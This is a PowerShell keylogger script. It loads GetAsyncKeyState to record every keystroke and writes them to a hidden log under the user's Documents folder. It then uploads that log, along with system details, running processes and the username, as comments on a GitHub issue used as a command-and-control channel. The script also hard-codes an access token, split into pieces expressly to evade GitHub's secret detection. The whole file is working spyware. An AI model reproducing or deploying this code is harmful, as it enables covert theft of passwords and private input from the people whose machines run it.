#Import GetAsyncKeyState DLL for the input logger
$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); 
'@

#Use this function to write to the console log. Proper usage: Write-Console -Text $textVar -IssueNumber $issueNum
function Write-Console
{
	param([String]$Text, [int]$IssueNumber)
	$consoleLogPath = "$env:USERPROFILE\Documents\WindowsPowerShell\console.log"
	$timeStamp = Get-Date -Format G
	try
	{
		Add-Content -Path $consoleLogPath -Value ($timeStamp + ": " + $Text + "`n")
	}
	catch
	{
		New-GitHubComment -OwnerName BeinnUais1 -RepositoryName ceannard1 -Issue $IssueNumber -Body ($timeStamp + ": Encountered an error trying to write to the console log. The error message is: " + $Error)
		Exit
	}
}

function Write-Input
{
	param([String]$Text, [int]$IssueNumber)
	$inputLogPath = "$env:USERPROFILE\Documents\WindowsPowerShell\input.log"
	try
	{
		Add-Content -Path $inputLogPath -Value $Text
	}
	catch
	{
		New-GitHubComment -OwnerName BeinnUais1 -RepositoryName ceannard1 -Issue $IssueNumber -Body ("Encountered an error trying to write to the input log. The error message is: " + $Error)
		Exit
	}
}

function Start-Logging
{
	param([int]$IssueNumber)

	#Load GetAsyncKeyState so we can use it.
	#Note: GetAsyncKeyState cannot record keystrokes made while a higher integrity application is in focus.
	try 
	{
		$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
		Write-Console -Text ("Loaded the GetAysncKeyState DLL OK.") -IssueNumber $issueNum
		Write-Host ("DEBUG: Loaded the GetAysncKeyState DLL OK.")
	}
	catch 
	{
		New-GitHubComment -OwnerName BeinnUais1 -RepositoryName ceannard1 -Issue $issueNum -Body ("Exception thrown trying to load the GetAsyncKeyState DLL. Exiting. Message: " + $Error)
		Write-Console -Text ("Exception thrown trying to load the GetAsyncKeyState DLL. Exiting. Message: " + $Error) -IssueNumber $issueNum
		Write-Host ("DEBUG: Exception thrown trying to load the GetAsyncKeyState DLL. Exiting. Message: " + $Error); Start-Sleep -s 600
		Exit
	}
	
	#Buffer all the input we need to write to the log in this variable. Declare it here so it remains in scope during the core logging loop.
	$inputBuffer = ""

	#Create the array to track if we can write the key. Writing is only allowed if the key was released since it was last written to the log.
	[bool[]]$writeOK = @($true)
	For($i=0; $i -lt 255; $i++)
	{
		$writeOK += $true
	}

	#Core input logging loop. This will loop very frequently so make sure the performance is good.
	While($true)
	{
		#Check if we need to write the buffer to the input log file
		If($inputBuffer.length -gt 250)
		{
			try
			{
				Write-Input -Text $inputBuffer -IssueNumber $IssueNumber
				Write-Console -Text ("Wrote the input buffer to the input log. Clearing.") -IssueNumber $issueNum
				Write-Host ("DEBUG: Wrote the input buffer to the input log. Clearing.")
				$inputBuffer = ""
			}
			catch
			{
				New-GitHubComment -OwnerName BeinnUais1 -RepositoryName ceannard1 -Issue $issueNum -Body ("Exception thrown trying to write input from the buffer to the log. Exiting. Message: " + $Error)
				Write-Console -Text ("Exception thrown trying to write input from the buffer to the log. Exiting. Message: " + $Error) -IssueNumber $issueNum
				Write-Host ("DEBUG: Exception thrown trying to write input from the buffer to the log. Exiting. Message: " + $Error); Start-Sleep -s 600
				Exit
			}
		}
		#Loop through all the keys and write depressed keys to the input buffer, then set their writeOK state to false until they're released.
		For($i=0; $i -lt 255; $i++)
		{
			try 
			{
				If(($API::GetAsyncKeyState($i) -gt 30000) -Or ($API::GetAsyncKeyState($i) -lt -30000))
				{
					If($writeOK[$i] -And !($i -eq 16) -And !($i -eq 17) -And !($i -eq 18) -And !($i -eq 160) -And !($i -eq 162) -And !($i -eq 164))
					{
						#Start the write to the input buffer with the "?" character
						$inputBuffer = ($inputBuffer + "?")
						
						#Write the modifier key codes to the input buffer
						If(($API::GetAsyncKeyState(160) -gt 30000) -Or ($API::GetAsyncKeyState(160) -lt -30000) -Or ($API::GetAsyncKeyState(16) -gt 30000) -Or ($API::GetAsyncKeyState(16) -lt -30000))
						{
							$inputBuffer = ($inputBuffer + "S")
						}
						If(($API::GetAsyncKeyState(162) -gt 30000) -Or ($API::GetAsyncKeyState(162) -lt -30000) -Or ($API::GetAsyncKeyState(17) -gt 30000) -Or ($API::GetAsyncKeyState(17) -lt -30000))
						{
							$inputBuffer = ($inputBuffer + "C")
						}
						If(($API::GetAsyncKeyState(164) -gt 30000) -Or ($API::GetAsyncKeyState(164) -lt -30000) -Or ($API::GetAsyncKeyState(18) -gt 30000) -Or ($API::GetAsyncKeyState(18) -lt -30000))
						{
							$inputBuffer = ($inputBuffer + "A")
						}
						$inputBuffer = ($inputBuffer + $i)
						$writeOK[$i] = $false
						Write-Host ("DEBUG: Wrote key code $i to log.")
					}
				}
				Else
				{
					$writeOK[$i] = $true
				}
			}
			catch 
			{
				New-GitHubComment -OwnerName BeinnUais1 -RepositoryName ceannard1 -Issue $issueNum -Body ("Exception thrown getting key state. Exiting. Message: " + $Error)
				Write-Console -Text ("Exception thrown getting key state. Exiting. Message: " + $Error) -IssueNumber $issueNum
				Write-Host ("DEBUG: Exception thrown getting key state. Exiting. Message: " + $Error); Start-Sleep -s 600
				Exit
			}
		}
		Start-Sleep -m 10
	}
}

#ENTRY POINT
#Confirm that NuGet is installed. If not, install it and confirm installation.
If((Get-PackageProvider).Name -clike 'NuGet')
{
	Write-Host "DEBUG: NuGet OK."
}
Else
{
	try
	{
		Write-Host "DEBUG: NuGet not found. Attempting to install NuGet..."
		Install-PackageProvider -Name NuGet -scope CurrentUser -Force
		Write-Host "DEBUG: NuGet installation command has finished executing."

		#Verify that NuGet was installed correctly.
		If((Get-PackageProvider).Name -clike 'NuGet')
		{
			Write-Host "DEBUG: NuGet installation appears to be successful."
		}
		Else
		{
			Write-Host "DEBUG: NuGet installation appears to have failed. Exiting."; Start-Sleep -s 600
			Exit
		}
	}
	catch
	{
		Write-Host "DEBUG: NuGet installation threw an exception. Exiting."; Start-Sleep -s 600
		Exit
	}
}

#Confirm that PowerShellForGitHub is installed. If not, install it and confirm installation.
If((Get-InstalledModule).Name -clike 'PowerShellForGitHub')
{
	Write-Host "DEBUG: PowerShellForGitHub OK."
}
Else
{
	try
	{
		Write-Host "DEBUG: PowerShellForGitHub not found. Attempting to install PowerShellForGitHub..."
		Install-Module -Name PowerShellForGithub -Scope CurrentUser -Force
		Write-Host "DEBUG: PowerShellForGitHub installation command has finished executing."

		#Verify that PowerShellForGitHub was installed correctly.
		If((Get-InstalledModule).Name -clike 'PowerShellForGitHub')
		{
			Write-Host "DEBUG: PowerShellForGitHub installation appears to be successful."
		}
		Else
		{
			Write-Host "DEBUG: PowerShellForGitHub installation appears to have failed. Exiting."; Start-Sleep -s 600
			Exit
		}
	}
	catch
	{
		Write-Host "DEBUG: PowerShellForGitHub installation threw an exception. Exiting."; Start-Sleep -s 600
		Exit
	}
}

#We must import PSFG each time we start a new PowerShell session.
try 
{
	Import-Module -Name PowerShellForGitHub
	Write-Host "DEBUG: PowerShellForGitHub import OK."
}
catch
{
	Write-Host "DEBUG: PowerShellForGitHub import threw an exception. Exiting."; Start-Sleep -s 600
	Exit
}

#Disable telemetry on PSFG.
try 
{
	Set-GitHubConfiguration -DisableTelemetry -SessionOnly
	Write-Host "DEBUG: Telemetry disabled OK."
}
catch 
{
	Write-Host "DEBUG: Disabling telemetry threw an exception. Exiting."; Start-Sleep -s 600
	Exit
}

#Login to GitHub using our auth token. Make sure to split up the token so GitHub can't detect it and disable it for us.
try 
{
	$token = 'ffbc' + 'f7ac0f2e' + '9b703fcfd17e4f' + 'ab4104269e81ad'
	$secure = ConvertTo-SecureString $token -AsPlainText -Force
	$cred = New-Object System.Management.Automation.PSCredential "USERNAME_IS_IGNORED", $secure
	Set-GitHubAuthentication -Credential $cred
	$user = Get-GitHubUser -Current
	If($user.login -clike 'BeinnUais1')
	{
		Write-Host "DEBUG: Logged in succesfully."
	}
	Else
	{
		Write-Host "DEBUG: Login failed. Exiting."; Start-Sleep -s 600
		Exit
	}
}
catch 
{
	Write-Host "DEBUG: Exception or error thrown while trying to log in to GitHub. Exiting."; Start-Sleep -s 600
	Exit
}

#Use Get-ComputerInfo to get the allegedly unique ProductID which is used to identify the specific machine during communications with C2.
$compInfo = Get-ComputerInfo
Write-Host "DEBUG: Finished getting computer info."

#Declare the issue number variable here so it remains in scope. Zero is not a valid issue number, so that can be used for error checking.
$issueNum = 0

#Get the issue number this machine will use to communicate. If an issue for this machine does not exist, create one and verify it was created successfully.
try
{
	$issueList = Get-GitHubIssue -OwnerName BeinnUais1 -RepositoryName ceannard1
	$issueList | ForEach-Object -Process `
	{
		If($_.Title -clike $compInfo.WindowsProductID)
		{
			$issueNum = $_.number
			Write-Host "DEBUG: Found the issue number for this machine OK."	
		}
	}
	#Only executes if the $issueNum wasn't set above because the ProductID has no associated issue.
	If($issueNum -clike "0")
	{
		New-GitHubIssue -OwnerName BeinnUais1 -RepositoryName ceannard1 -Title $compInfo.WindowsProductID -Body $env:USERNAME
		Write-Host "DEBUG: Just tried to create a new issue for this machine. Verifying..."
		$issueList = Get-GitHubIssue -OwnerName BeinnUais1 -RepositoryName ceannard1
		$issueList | ForEach-Object -Process `
		{
			If($_.Title -clike $compInfo.WindowsProductID)
			{
				$issueNum = $_.number
				Write-Host "DEBUG: New issue for this machine created OK."
			}
		}
		#Confirm that $issueNum now has the correct issue number that we created above.
		If($issueNum -clike "0")
		{
			Write-Host "DEBUG: Issue creation failed. Unable to find an issue associated with this machine."; Start-Sleep -s 600
			Exit
		}
	}
}
catch
{
	Write-Host ("DEBUG: Exception thrown trying to identify or create an issue associated with this machine. Exiting."); Start-Sleep -s 600
	Exit
}

#Check if $env:UserProfile\Documents\WindowsPowerShell exists, if not, create and verify it. We are now logged in to GitHub and can post an error message.
$logFolderPath = "$env:USERPROFILE\Documents\WindowsPowerShell"
if ($logFolderPath | Test-Path)
{
	Write-Host "DEBUG: Logs folder located OK."
}
Else
{
	try
	{
		Write-Host "DEBUG: Trying to create the logs folder..."
		[System.IO.Directory]::CreateDirectory($logFolderPath)
		Write-Host "DEBUG: No exceptions thrown creating the logs folder. Verifying..."
	}
	catch
	{
		New-GitHubComment -OwnerName BeinnUais1 -RepositoryName ceannard1 -Issue $issueNum -Body ("Exception thrown trying to create the logs folder. Message: " + $Error)
		Write-Host "DEBUG: Exception thrown trying to create the logs folder. Notified C2. Exiting."; Start-Sleep -s 600
		Exit
	}
	if (-not ($logFolderPath | Test-Path))
	{
		New-GitHubComment -OwnerName BeinnUais1 -RepositoryName ceannard1 -Issue $issueNum -Body ("No exceptions thrown, but unable to locate the logs folder. Exiting.")
		Write-Host "DEBUG: Unable to locate the logs folder despite no exceptions being thrown. Notified C2. Exiting."; Start-Sleep -s 600
		Exit
	}
}

#Write footer to console log before uploading it.
Write-Console -Text "Startup OK. Printing computer information." -IssueNumber $issueNum
Write-Console -Text ($compInfo | Out-String) -IssueNumber $issueNum
Write-Console -Text (Get-Process).ProcessName -IssueNumber $issueNum
Write-Console -Text "Uploading log to C2." -IssueNumber $issueNum

#Upload the console log to C2, then clear it.
try 
{
	$consoleLogPath = "$env:USERPROFILE\Documents\WindowsPowerShell\console.log"
	If([System.IO.File]::Exists($consoleLogPath))
	{
		New-GitHubComment -OwnerName BeinnUais1 -RepositoryName ceannard1 -Issue $issueNum -Body (Get-Content -Path $consoleLogPath -Raw)
		Write-Console -Text "Uploaded console log to C2. Clearing it..." -IssueNumber $issueNum
		Write-Host "DEBUG: Uploaded the console log to C2. Clearing it...."
		Clear-Content -Path $consoleLogPath
		Write-Console -Text "Cleared the old console log." -IssueNumber $issueNum
		Write-Host "DEBUG: Cleared the old console log."
	}
	Else
	{
		New-GitHubComment -OwnerName BeinnUais1 -RepositoryName ceannard1 -Issue $issueNum -Body ("Attempted to upload the console log, but was unable to find the file. Exiting.")
		Write-Console -Text "Attempted to upload the console log, but was unable to find the file. Exiting." -IssueNumber $issueNum
		Write-Host "DEBUG: Attempted to upload the console log, but was unable to find the file. Exiting."; Start-Sleep -s 600
		Exit
	}
}
catch 
{
	New-GitHubComment -OwnerName BeinnUais1 -RepositoryName ceannard1 -Issue $issueNum -Body ("Exception thrown trying to upload the console log file. Exiting. Message: " + $Error)
	Write-Console -Text "Exception thrown trying to upload the console log file. Notified C2. Exiting." -IssueNumber $issueNum
	Write-Host "DEBUG: Exception thrown trying to upload the console log file. Notified C2. Exiting."; Start-Sleep -s 600
	Exit
}

#Write header to new console log.
Write-Console -Text "Printing computer information..." -IssueNumber $issueNum
Write-Console -Text ($compInfo | Out-String) -IssueNumber $issueNum
Write-Console -Text (Get-Process).ProcessName -IssueNumber $issueNum
Write-Console -Text "Begin new log." -IssueNumber $issueNum

#Upload the input log and clear it.
try 
{
	$inputLogPath = "$env:USERPROFILE\Documents\WindowsPowerShell\input.log"
	If([System.IO.File]::Exists($inputLogPath))
	{
		New-GitHubComment -OwnerName BeinnUais1 -RepositoryName ceannard1 -Issue $issueNum -Body ((Get-Content -Path $inputLogPath -Raw) + "INPUT LOG END")
		Write-Console -Text "Uploaded the input log to C2. Clearing it..." -IssueNumber $issueNum
		Write-Host "DEBUG: Uploaded the input log to C2. Clearing it..."
		Clear-Content -Path $inputLogPath
		Write-Console -Text "Cleared the old console log." -IssueNumber $issueNum
		Write-Host "DEBUG: Cleared the old console log."
	}
	Else
	{
		Write-Console -Text "Input log wasn't found. Attempting to create..." -IssueNumber $issueNum
		Write-Host "DEBUG: Input log wasn't found. Attempting to create..."
		Add-Content -Path $inputLogPath -Value ("BEGIN INPUT LOG" + "`n")
		If([System.IO.File]::Exists($inputLogPath))
		{
			New-GitHubComment -OwnerName BeinnUais1 -RepositoryName ceannard1 -Issue $issueNum -Body ((Get-Content -Path $inputLogPath -Raw) + "INPUT LOG END")
			Write-Console -Text "Created the input log and uploaded it to C2." -IssueNumber $issueNum
			Write-Host "DEBUG: Created the input log and uploaded it to C2."
		}
		Else
		{
			New-GitHubComment -OwnerName BeinnUais1 -RepositoryName ceannard1 -Issue $issueNum -Body ("Unable to locate or create the input log file. Exiting.")
			Write-Console -Text "Unable to locate or create the input log file. Exiting." -IssueNumber $issueNum
			Write-Host "DEBUG: Unable to locate or create the input log file. Exiting."; Start-Sleep -s 600
			Exit
		}
	}
}
catch 
{
	New-GitHubComment -OwnerName BeinnUais1 -RepositoryName ceannard1 -Issue $issueNum -Body ("Exception thrown trying to upload or create the input log file. Exiting. Message: " + $Error)
	Write-Console -Text ("Exception thrown trying to upload or create the input log file. Exiting. Message: " + $Error) -IssueNumber $issueNum
	Write-Host ("DEBUG: Exception thrown trying to upload or create the input log file. Exiting. Message: " + $Error); Start-Sleep -s 600
	Exit
}

#Start the input logging function. It will run until the machine is rebooted.
Write-Console -Text ("Startup operations complete. Begin logging.") -IssueNumber $issueNum
Write-Host "DEBUG: Startup operations complete. Begin logging."
try
{
	Start-Logging
}
catch
{
	New-GitHubComment -OwnerName BeinnUais1 -RepositoryName ceannard1 -Issue $issueNum -Body ("Exception thrown trying to start logging. Exiting. Message: " + $Error)
	Write-Console -Text ("Exception thrown trying to start logging. Exiting. Message: " + $Error) -IssueNumber $issueNum
	Write-Host ("DEBUG: Exception thrown trying to start logging. Exiting. Message: " + $Error); Start-Sleep -s 600
	Exit
}
